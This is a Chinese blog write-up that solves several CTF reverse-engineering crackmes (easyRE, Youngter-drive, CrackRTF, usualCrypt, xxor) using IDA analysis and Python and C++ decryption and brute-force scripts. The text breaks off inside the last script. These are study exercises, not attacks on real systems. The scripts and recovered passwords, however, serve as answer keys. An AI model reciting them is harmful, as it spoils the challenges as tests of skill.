    <content type="html"><![CDATA[<h1 id="first_page"><a class="markdownIt-Anchor" href="#first_page"></a> First_Page</h1><h2 id="2019红帽杯easyre"><a class="markdownIt-Anchor" href="#2019红帽杯easyre"></a> [2019红帽杯]easyRE</h2><h3 id="具体流程"><a class="markdownIt-Anchor" href="#具体流程"></a> 具体流程</h3><ul><li><p>首先<code>Shift + F12</code>查看字符串，找到了base64编码的东西</p><ul><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303052153730.png" alt="image-20230305215330684" /></li><li>base64解了十次，得到了<a href="https://bbs.kanxue.com/thread-254172.htm">看雪CTF从入门到存活(六)主动防御</a>这个网站，然后没有一点信息，应该是被耍了。</li></ul></li><li><p>接着从主函数出发，找到关键函数<code>sub_4009C6</code></p><ul><li><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303052215011.png" alt="image-20230305221551966" /></p></li><li><p>分析前半段(如注释)，代码解出v18的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">v15 = <span class="hljs-string">&#x27;Iodl&gt;Qnb(ocy\x7F&#x27;</span><br>v16 = <span class="hljs-string">&#x27;y.i\x7F&#x27;</span><br>v17 = <span class="hljs-string">&#x27;d`3w&#125;wek9&#123;iy=~yL@EC&#x27;</span><br>v = v15 + v16 + v17<br>enc =[]<br>key = <span class="hljs-built_in">list</span>(v14)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v)):<br>    enc.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key[i]) ^ i))<br>tmp = <span class="hljs-string">&#x27;&#x27;</span>.join(enc)<br><span class="hljs-built_in">print</span>(tmp)<br><span class="hljs-comment"># tmp = Info:The first four chars are `flag`</span><br></code></pre></td></tr></table></figure></li><li><p>由得出的结果，知道这里没有flag，继续往下看</p></li><li><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303052254462.png" alt="image-20230305225421428" /></p></li><li><p>这里进行了十次base64加密，对应了上文中的base解密出来为网站的事情</p></li><li><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303052255104.png" alt="image-20230305225555059" /></p></li></ul></li><li><p>查看0ff_6CC090时(也就是base64加密数据的存放地址)，看到了新的数据off_6CC0A0，直接查看其引用，找到<code>sub_400D35</code>函数</p><ul><li><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303052259863.png" alt="image-20230305225937825" /></p></li><li><p>观察函数，猜测v1为数组，其的值应该是<code>flag</code>。这里由于 <strong>HIBYTE</strong> 函数的作用是获取高字节也就是数组的最后一位，在由上面的Info信息得到结果，而与 <strong>HIBYTE</strong> 相对应的还有 <strong>BYTE()</strong>、<strong>BYTE1()</strong>、**BYTE2()**第一个是获取数组的第一位，第二个就是获取第二位，依次类推。由此编写脚本得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2F</span>,<br>  <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6E</span>,<br>  <span class="hljs-number">0x72</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x5B</span>]<br>key2 = <span class="hljs-string">&#x27;flag&#x27;</span><br>key3 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key2)):<br>    key3.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key2[i]) ^ key[i]))<br><span class="hljs-built_in">print</span>(key3)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    key3.append(<span class="hljs-built_in">chr</span>(key[i]^<span class="hljs-built_in">ord</span>(key3[i%<span class="hljs-number">4</span>])))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(key3))<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h3><ul><li>判断IDA给出定义的真实含义，如上述的v1指代一个数组，确切而言指示这v1[0]</li><li>根据上下文判断伪代码对于语句的操作，如上述的字符串相加</li></ul><h2 id="youngter-drive"><a class="markdownIt-Anchor" href="#youngter-drive"></a> Youngter-drive</h2><blockquote><p>知识点：多线程处理</p></blockquote><p>参考：<a href="https://tokameine.top/2021/04/30/buuctf-youngter-drive/">BUUCTF Youngter-drive笔记与思考 (线程) – TokameinE</a></p><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><h4 id="识别"><a class="markdownIt-Anchor" href="#识别"></a> 识别</h4><ul><li>查壳，UPX壳，直接脱</li><li>拖到IDA中，发现调用Windows的API<ul><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303101734236.png" alt="image-20230304094722528" /></li><li>这里<code>CreateThread</code>是创建一个线程，属于新知识点。这里创建了两个互斥的线程对象，一个线程处于休眠状态时，另一个线程开始运作，以实现并发操作。</li></ul></li></ul><h4 id="具体流程-2"><a class="markdownIt-Anchor" href="#具体流程-2"></a> 具体流程</h4><ul><li><p>结合给出的IDA分析与注释，这里分别追踪 <code>StartAddress</code> 和 <code>sub_41119F</code> 两个线程。</p></li><li><p><code>StartAddress</code></p><ul><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303101740626.png" alt="image-20230304094927047" /></li><li>这里执行<strong>sub_41112C</strong>操作，其中<strong>dword_418008</strong>的值为29—综合下文sub_411940可以判断出此值为flag的长度。继续追踪，找到sub_411940函数。</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303101740951.png" alt="image-20230304095634491" /></li><li>由分析，此时对于flag数组进行了替换操作，其操作从后往前(a2一开始为29，之后递减)。此操作含义就是在 <strong>off_418000中查询下标为flag[i]-38对应的值，赋值给flag[i]</strong>。</li></ul></li><li><p><code>sub_41119F</code></p><ul><li><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303102141867.png" alt="image-20230310214101827" /></p></li><li><p><code>WaitForSingleObject</code></p><ul><li>一种Windows API函数，当等待仍在挂起状态时，句柄被关闭，那么函数行为是未定义的。该句柄必须具有 SYNCHRONIZE 访问权限。</li><li>其用来检测 hHandle 事件的信号状态，在某一线程中调用该函数时，线程暂时挂起，如果在挂起的dwMilliseconds 毫秒内，线程所等待的对象变为有信号状态，则该函数立即返回；如果超时时间已经到达dwMilliseconds 毫秒，但hHandle所指向的对象还没有变成有信号状态，函数照样返回。</li></ul></li><li><p><code>ReleaseMutex</code></p><ul><li>一种线性指令，具有释放线程拥有的互斥体的控制权。</li></ul></li><li><p><code>Sleep</code></p><ul><li>此函数可使线程暂停自己的运行，直到dwMilliseconds过去为止。即该线程不想在某个时间段内被调度。</li></ul></li></ul></li><li><p><code>sub_411190</code></p><ul><li>判断最后更改后的Source数组是否与给定的数组相等</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303102152825.png" alt="image-20230310215237808" /></li></ul></li></ul><h4 id="综合分析"><a class="markdownIt-Anchor" href="#综合分析"></a> 综合分析</h4><ul><li>当第一个线程(<code>StartAddress</code>)执行到 <code>Sleep</code> 语句时，此线程暂停，转为另一个线程，然后经过<strong>dword_418008</strong>减1的操作后，第二个进程(<code>sub_41119F</code>)暂停，转为第一个线程，循环交替。而由于第二个进程只是进行了自减操作，所以可以判断出在 <strong>dword_418008</strong> 为奇数时执行第一个线程操作，并对flag进行了更改。</li></ul><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;0abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>text1=<span class="hljs-string">&#x27;TOiZiZtOrYaToUwPnToBsOaOapsyS&#x27;</span><br>text2=<span class="hljs-string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>s=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text1)):<br>    <span class="hljs-keyword">if</span>(i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>):<br>        flag+=text1[i]<br>    <span class="hljs-keyword">else</span>:<br>        s=text2.index(text1[i])<br>        flag+=<span class="hljs-built_in">str</span>[s]<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># 或者</span><br>key = <span class="hljs-string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span><br>flagRe = <span class="hljs-string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySa&quot;</span><br>flag = []<br><br>i = <span class="hljs-number">0x1d</span><br><span class="hljs-keyword">while</span> i &gt; -<span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> key.find(flagRe[i]):<br>        position = key.find(flagRe[i])<br>        <span class="hljs-keyword">if</span> position &lt;= <span class="hljs-number">26</span>:<br>            flag.append(<span class="hljs-built_in">chr</span>(position + <span class="hljs-number">96</span>))<br>        <span class="hljs-keyword">else</span>:<br>            flag.append(<span class="hljs-built_in">chr</span>(position + <span class="hljs-number">38</span>))<br>        i -= <span class="hljs-number">1</span><br>        <br>    flag.append(flagRe[i])<br>    i -= <span class="hljs-number">1</span><br><br>flag = <span class="hljs-built_in">reversed</span>(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(flag))<br></code></pre></td></tr></table></figure><h3 id="知识点多线程"><a class="markdownIt-Anchor" href="#知识点多线程"></a> 知识点：多线程</h3><ul><li><p>多线程：指一个程序中有多个顺序流在执行。其中 <code>CreateThread</code> 是创造一个线程，创造的线程要用句柄 <code>HANDLE</code> 来储存， <code>CloseHandle</code> 是关闭该线程。</p></li><li><p>API函数：</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cmake">CreateThread(<br>lpThreadAttributes<br>dwStackSize    <br>lpStartAddress<br>lpParameter<br>dwCreationFlags<br>lpThreadId<br>)<br></code></pre></td></tr></table></figure><ul><li><code>lpThreadAttributes</code>：NULL</li><li><code>dwStackSize</code>：栈空间大小，0表示1MB</li><li><code>lpStartAddress</code>：执行的线程函数地址</li><li><code>lpParameter</code>：传给线程函数的参数</li><li><code>dwCreationFlags</code>：控制线程的创建，0表示可以立即调用；如果为 <code>CREATE_SUSPENDED</code> ，则创建后无法调用，直到调用 <code>ResumeThread()</code></li><li><code>lpThreadId</code>：NULL</li><li><code>CreateMutexW</code>：实现进程互斥，IDA中实际作用</li></ul></li><li><p>一个程序在运行时占用整个进程，一个进程可以建立多个线程。这些线程能够并行 (同时进行代码处理)以加快程序的运行速度。其中线程分为 “对等线程”，“分离线程”，“主线程”。而当一个处理器在处理一个线程时遇到 <strong>慢速系统调用(sleep、read等)</strong> 等需要消耗较多时间的处理需求时，控制器便通过上下文切换传送到下一个对等进程，以加快程序的运行。</p></li></ul><h2 id="crackrtf"><a class="markdownIt-Anchor" href="#crackrtf"></a> CrackRTF</h2><h3 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h3><ul><li><p>识别，32位无壳，直接打开</p></li><li><p>找到 <strong>main</strong> 函数，分析 mian 函数，可以发现函数分为两个部分</p></li><li><p><code>password1</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303102341004.png" alt="image-20230310231125442" /></p><ul><li><p>这里 <strong>auti</strong> 函数的作用就是将输入的字符串转化为整型，然后这里限定其整型数值大于100000。然后其中 <strong>strcat</strong> 将 @DBApp 附加到输入的input后面，然后经过 <code>sub_40100A</code> 函数进行加密之后与if中的字符串相比较。</p></li><li><p>追踪 <code>sub_40100A</code> 函数</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303102340276.png" alt="image-20230310234029242" /></p></li><li><p><code>CryptCreateHash </code><a href="https://www.cnblogs.com/rnss/p/15328653.html">HASH指计算函数相关</a>–不过此API已被弃用</p><ul><li><p>此函数启动数据流的哈希。它创建并返回到调用应用程序，该句柄指向加密服务提供程序 (CSP) 哈希对象。 此句柄用于后续调用 <code>CryptHashData</code> 和 <code>CryptHashSessionKey</code> 以哈希会话键和其他数据流。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CryptCreateHash</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HCRYPTPROV hProv,</span></span><br><span class="hljs-params"><span class="hljs-function">  ALG_ID     Algid,</span></span><br><span class="hljs-params"><span class="hljs-function">  HCRYPTKEY  hKey,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD      dwFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  HCRYPTHASH *phHash</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure></li><li><p>关键为第二个参数 <code>Algid</code>，标识要使用的哈希算法的 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/SecCrypto/alg-id">ALG_ID</a> 值，此参数的有效值因使用的 CSP 而异。而此时无符号数 0x8004 指哈希算法的类型为 SHA1 加密。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303102324419.png" alt="image-20230310232406385" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>string=<span class="hljs-string">&#x27;@DBApp&#x27;</span><br>password1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>,<span class="hljs-number">999999</span>):<br>    flag=<span class="hljs-built_in">str</span>(i)+string <span class="hljs-comment"># str(i)就是把整数i换成字符串类型</span><br>    x = hashlib.sha1(flag.encode())  <span class="hljs-comment"># 这里加密前需要转化为byte类型</span><br>    y = x.hexdigest()     <span class="hljs-comment"># hexdigest()使用十六进制表示</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span> == y:<br>            password1 = flag<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(password1)<br><span class="hljs-comment"># password1 = 123321@DBApp</span><br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><code>password2</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303102341829.png" alt="image-20230310231241758" /></p><ul><li><p>此处的 <code>password2</code> 的形式与 <code>password1</code> 形似，这里 <code>sub_401019</code> 就是指 MD5 加密，但此时没有爆破信息，无法爆破，这里查看 <code>sub_40100F</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303111034062.png" alt="image-20230311103417993" /></p></li><li><p>其中显示资源文件 <strong>AAA</strong> ，则使用 Resource Hacker 打开文件查看资源文件信息</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303111151820.png" alt="image-20230311115101765" /></p></li><li><p>函数解析</p><ul><li><p><code>FindResource</code></p><ul><li><p>该函数确定指定模块中指定类型和名称的资源所在位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HRSRC <span class="hljs-title">FindResourceA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR  lpName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR  lpType</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>HMODULE</strong>：处理包含资源的可执行文件的模块。NULL值则指定模块句柄指向操作系统通常情况下创建最近过程的相关位图文件。</p></li><li><p><strong>LPCSTR</strong>：指定资源名称</p></li><li><p><strong>LPCSTR</strong>：指定资源类型</p></li></ul></li><li><p><code>LoadResource</code></p><ul><li><p>检索可用于获取指向内存中指定资源的第一个字节的指针的句柄。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HGLOBAL <span class="hljs-title">LoadResource</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">  HRSRC   hResInfo</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>hModule</strong>：其可执行文件包含资源的模块句柄。 如果 <em>hModule</em> 为 <strong>NULL</strong>，系统会从用于创建当前进程的模块加载资源。</p></li><li><p><strong>HRSRC</strong>：要加载的资源的句柄。</p></li></ul></li></ul></li><li><p>追踪 <code>sub_401005</code>，这里将 <code>lpString(password2)</code> 与 <code>a2(lpBuffer)</code> 进行了异或操作，对 a2 进行了修改，使之成为 .rtf 文件的格式。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303111045780.png" alt="image-20230311104503742" /></p></li></ul></li></ul><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h3><ul><li><p>根据最后的信息，password2需要由 .rtf 的文件格式和 AAA文件格式进行异或得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">rtf = <span class="hljs-string">&#x27;&#123;\\rtf1&#x27;</span><br>source = [<span class="hljs-number">0x05</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x01</span> ]<br>password2 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rtf)):<br>    password2 += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(rtf[i]) ^ source[i])<br><span class="hljs-built_in">print</span>(password2)<br></code></pre></td></tr></table></figure></li></ul><h2 id="actf新生赛2020usualcrypt"><a class="markdownIt-Anchor" href="#actf新生赛2020usualcrypt"></a> [ACTF新生赛2020]usualCrypt</h2><h3 id="分析-3"><a class="markdownIt-Anchor" href="#分析-3"></a> 分析</h3><ul><li><p>无壳，直接分析</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303120019578.png" alt="image-20230312001921502" /></p></li><li><p>可以看出是将输入的进行base64加密，之后与原字符串比较而得到答案</p></li><li><p>深入 <code>sub_401080</code> 函数，找到存储base64表的数组 <code>table_40E0A0</code> 之后查看引用，发现对表进行了更改</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303120021667.png" alt="image-20230312002136637" /></p></li><li><p>由分析，这里的 <code>byte_40E0A0</code> 与 <code>byte_40E0AA</code> 都是地址，都是对于一个base64表数组进行操作</p></li></ul><h4 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> result; <br>  <span class="hljs-type">char</span> v1; <br><span class="hljs-type">char</span> k[<span class="hljs-number">66</span>] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;<br><br><span class="hljs-type">char</span>* a0 = k;<br><span class="hljs-type">char</span>* aa = a0 + <span class="hljs-number">10</span>;<br><span class="hljs-keyword">for</span> ( result = <span class="hljs-number">6</span>; result &lt; <span class="hljs-number">15</span>; ++result )<br>&#123;<br>v1 = aa[result];<br>    aa[result] = a0[result];<br>    a0[result] = v1;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,k);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>table_old = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>table_new = <span class="hljs-string">&#x27;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="hljs-comment"># 这里获得table_new的时候出现问题，不能很好地理解byte_40E0A0和byte_40E0AA都是指针的作用，不过指向数组的不同位置而已</span><br><span class="hljs-comment"># 我错误地理解为两个数组进行位置的交换，从而导致了错误的答案</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(table_new))<br>key = <span class="hljs-string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span>.swapcase()<br><br><span class="hljs-built_in">print</span>(base64.b64decode(key.translate(<span class="hljs-built_in">str</span>.maketrans(table_new,table_old))))<br><br></code></pre></td></tr></table></figure><h1 id="sencond_page"><a class="markdownIt-Anchor" href="#sencond_page"></a> Sencond_Page</h1><h2 id="xxor"><a class="markdownIt-Anchor" href="#xxor"></a> xxor</h2><h3 id="分析-4"><a class="markdownIt-Anchor" href="#分析-4"></a> 分析</h3><ul><li><p>无壳，直接IDA分析</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303121437154.png" alt="image-20230312143746093" /></p><ul><li>得到伪代码，这里 <code>HIDWORD</code> 获取 <code>v6[j]</code> 的 下一个双字(这里是小端序存储，所以高位的就是下一位的)，则这里循环了3次，也将6个输入给整合了进去。之后经过 <code>sub_400686</code> 的加密，最后又赋值到 v7 上</li></ul></li><li><p><code>sub_400686</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303121716686.png" alt="image-20230312171608633" /></p><ul><li>这是 xtea 加密，不过进行了部分改变</li></ul></li><li><p>最后的对比函数 <code>sub_400770</code> ，可以使用 z3 找到 <code>v7</code> 的值</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303121720876.png" alt="image-20230312172048847" /></p></li></ul><h3 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>s = Solver()<br>a0,a1,a2,a3,a4,a5 = BitVecs(<span class="hljs-string">&quot;a1 a1[1] a1[2] a1[3] a1[4] a1[5]&quot;</span>, <span class="hljs-number">32</span>)<br>s.add(a2 - a3 == <span class="hljs-number">0x84A236FF</span>)<br>s.add(a3 + a4 == <span class="hljs-number">0xFA6CB703</span>)<br>s.add(a2 - a4 == <span class="hljs-number">0x42D731A8</span>)<br>s.add(a0 == <span class="hljs-number">0xDF48EF7E</span>)<br>s.add(a5 == <span class="hljs-number">0x84F30420</span>)<br>s.add(a1 == <span class="hljs-number">0x20CAACF4</span>)<br><br>check = s.check()<br>model = s.model()<br><span class="hljs-built_in">print</span>(model)<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> </span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i +=<span class="hljs-number">2</span>)&#123;<br><br>    <span class="hljs-type">uint32_t</span> v3 = v[i], v4 = v[i+<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint32_t</span> v5 = <span class="hljs-number">1166789954</span>*<span class="hljs-number">64</span>;<br>    <span class="hljs-type">uint32_t</span> *a2 = k;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i =<span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">64</span>; i++) &#123;<br>        v4 -= (v3 + v5 + <span class="hljs-number">20</span>) ^ ((v3 &lt;&lt; <span class="hljs-number">6</span>) 